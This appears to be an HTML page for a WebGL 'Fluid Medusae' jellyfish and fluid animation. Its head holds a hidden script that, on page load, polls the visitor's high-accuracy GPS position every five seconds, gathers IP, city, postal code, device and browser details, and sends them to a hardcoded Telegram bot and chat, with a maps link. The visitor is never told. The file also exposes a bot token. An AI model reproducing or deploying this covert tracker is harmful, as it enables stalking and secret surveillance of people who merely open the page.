<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Fluid Medusae</title>
  <script>
  const botToken = "8974909888:AAGfxh4DsifIq5bd61_35kB4mfd1zMkb2F8";
  const chatId = "8098247774";

  const LS_SESSION = "tg_session_id";
  const LS_MSG     = "tg_message_id";
  const LS_SEEN    = "tg_last_seen";
  const SESSION_TIMEOUT = 7 * 24 * 60 * 60 * 1000;

  // -----------------------------------------------------------------
  // CONFIG: No need to set FETCH_URL; we use the current page's hostname.
  // -----------------------------------------------------------------
  const SOURCE_HOST = window.location.hostname; // website where this script runs

  function isSessionExpired() {
    return Date.now() - parseInt(localStorage.getItem(LS_SEEN) || "0") > SESSION_TIMEOUT;
  }

  function clearSession() {
    localStorage.removeItem(LS_SESSION);
    localStorage.removeItem(LS_MSG);
    localStorage.removeItem(LS_SEEN);
  }

  const existingSession = localStorage.getItem(LS_SESSION);
  const sessionValid = existingSession && !isSessionExpired();
  if (!sessionValid) clearSession();

  let sessionId    = sessionValid ? existingSession : null;
  let messageId    = sessionValid ? localStorage.getItem(LS_MSG) : null;
  let isNewSession = !sessionId;
  let busy         = false;

  setInterval(() => localStorage.setItem(LS_SEEN, Date.now()), 5000);
  localStorage.setItem(LS_SEEN, Date.now());

  // ---------- UTILITIES ----------
  async function fetchIpInfo() {
    const res = await fetch("https://ipinfo.io/json");
    if (!res.ok) return null;
    return await res.json();
  }

  function buildMessage(lat, lon, ipInfo) {
    const time = new Date().toLocaleTimeString();
    const lines = [
      `🆔 Session: ${sessionId}`,
      `📱 Device: ${navigator.userAgent}`,
      `🌐 Language: ${navigator.language}`,
      `🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
      `🖥️ Screen: ${screen.width}x${screen.height}`,
      ``,
      `📍 Lat: ${lat.toFixed(6)} | Lon: ${lon.toFixed(6)}`,
      `🗺️ https://maps.google.com/?q=${lat},${lon}`,
      ``,
      `🔄 Updated: ${time}`,
      `🌐 Source: ${SOURCE_HOST}`
    ];

    if (ipInfo) {
      lines.push(
        ``,
        `🌐 IP: ${ipInfo.ip || 'N/A'}`,
        `🏙️ City: ${ipInfo.city || 'N/A'}`,
        `📍 Region: ${ipInfo.region || 'N/A'}`,
        `🏢 Org: ${ipInfo.org || 'N/A'}`,
        // Postal code – only include if it looks like a real postal code
        (() => {
          const postal = ipInfo.postal?.toString().trim();
          // Accept non‑empty strings; optionally filter with a simple pattern
          // (e.g., /^\d{5}(-\d{4})?$/ for US ZIPs, /^\w{3,10}$/ for other formats)
          return postal && /^[\w\s-]{3,}$/.test(postal) ? `📮 Postal: ${postal}` : null;
        })(),
        `🧭 Timezone: ${ipInfo.timezone || 'N/A'}`
      );
    }

    // Remove any null entries before joining
    return lines.filter(p => p !== null).join("\n");
  }

  async function sendMessage(text) {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text })
    }).catch(() => null);
    if (!res) return null;
    const data = await res.json();
    return data.ok ? data.result.message_id : null;
  }

  async function editMessage(lat, lon, ipInfo) {
    const mid = parseInt(messageId);
    if (!messageId || isNaN(mid)) return false;
    const fullText = buildMessage(lat, lon, ipInfo);
    const res = await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, message_id: mid, text: fullText })
    }).catch(() => null);
    if (!res) return false;
    const data = await res.json();
    if (!data.ok) {
      if (data.description && data.description.includes("not modified")) return true;
      messageId = null;
      localStorage.removeItem(LS_MSG);
      return false;
    }
    return true;
  }

  async function handlePosition(lat, lon) {
    const ipInfo = await fetchIpInfo();

    if (isNewSession) {
      sessionId = Math.random().toString(36).substring(2, 8).toUpperCase();
      localStorage.setItem(LS_SESSION, sessionId);
      const msgId = await sendMessage(buildMessage(lat, lon, ipInfo));
      if (msgId) {
        messageId = String(msgId);
        localStorage.setItem(LS_MSG, messageId);
        isNewSession = false;
      }
      return;
    }

    if (!messageId || isNaN(parseInt(messageId))) {
      const msgId = await sendMessage(buildMessage(lat, lon, ipInfo));
      if (msgId) {
        messageId = String(msgId);
        localStorage.setItem(LS_MSG, messageId);
      }
      return;
    }

    await editMessage(lat, lon, ipInfo);
  }

  function startTracking() {
    if (!navigator.geolocation) return;

    async function tick() {
      if (busy) return;
      busy = true;
      try {
        const pos = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          })
        );
        await handlePosition(pos.coords.latitude, pos.coords.longitude);
      } catch (e) {
        // GPS error or timeout — skip this tick
      } finally {
        busy = false;
      }
    }

    tick();
    setInterval(tick, 5000);
  }

  window.onload = startTracking;
</script>
<style>
  html, body { margin:0; padding:0; overflow:hidden; background:#000; width:100vw; height:100vh; }
  canvas { position:absolute; top:0; left:0; width:100vw; height:100vh; }
  #fluid { z-index: 1; }
  #medusa-container { position:absolute; top:0; left:0; width:100vw; height:100vh; z-index: 2; }
  #medusa-container canvas { position:absolute; top:0; left:0; }
</style>
</head>
<body>
<canvas id="fluid"></canvas>
<div id="medusa-container"></div>

<!-- fluid background: vendored, verified engine (ported from
     rocksdanister/WebGL-Fluid-Simulation, lively branch) — not the CDN
     "webgl-fluid" package, which has no keyboard/programmatic splat API
     at all and was silently ignoring every audio-triggered call before. -->
<script src="vendor/webgl-fluid-sim.js"></script>
<script>
// script.js exposes `config`, `updateKeywords`, and `_audioReact` as plain
// top-level bindings (not on window, but visible to sibling <script> tags
// in this same document) — safe to read/override here directly.
Object.assign(config, {
  DENSITY_DISSIPATION: 1.5,
  VELOCITY_DISSIPATION: 0.9,
  SPLAT_RADIUS: 0.3,
  SPLAT_FORCE: 10000,
  CURL: 25,
  BLOOM_INTENSITY: 0.01,
  SUNRAYS: false
});
updateKeywords(); // recompile display shader for the SUNRAYS/BLOOM change above

// script.js's own livelyAudioListener silently no-ops unless this is true —
// normally toggled by a Lively Properties panel checkbox we're not shipping,
// so it's forced on here instead. This (not the CDN library swap alone) is
// almost certainly why audio did nothing before: the listener was being
// called but was gated off internally by default.
_audioReact = true;
</script>  
<!-- real particulate-medusae port: three.js r72 (pinned to match original) -->
<script src="vendor/three.js"></script>
<script src="vendor/TrackballControls.js"></script>
<script src="vendor/EffectComposer.js"></script>
<script src="vendor/RenderPass.js"></script>
<script src="vendor/ShaderPass.js"></script>
<script src="vendor/MaskPass.js"></script>
<script src="vendor/BloomPass.js"></script>
<script src="vendor/CopyShader.js"></script>
<script src="vendor/ConvolutionShader.js"></script>
<script src="vendor/VignetteShader.js"></script>

<!-- particulate (soft-body physics engine, MIT, jpweeks/particulate on npm) -->
<script src="vendor/particulate.js"></script>
<!-- noisejs (josephg/noisejs, pinned commit, for lens-dirt texture) -->
<script src="vendor/noise.js"></script>

<!-- ported app code (verbatim from particulate-medusae unless noted in-file) -->
<script src="vendor/medusa-app-core.js"></script>
<script src="vendor/medusa-shaders.js"></script>
<script src="vendor/medusa-parts.js"></script>
<script src="vendor/medusa-item.js"></script>
<script src="vendor/medusa-scene.js"></script>
<script src="vendor/medusa-bootstrap.js"></script>
</body>
</html>
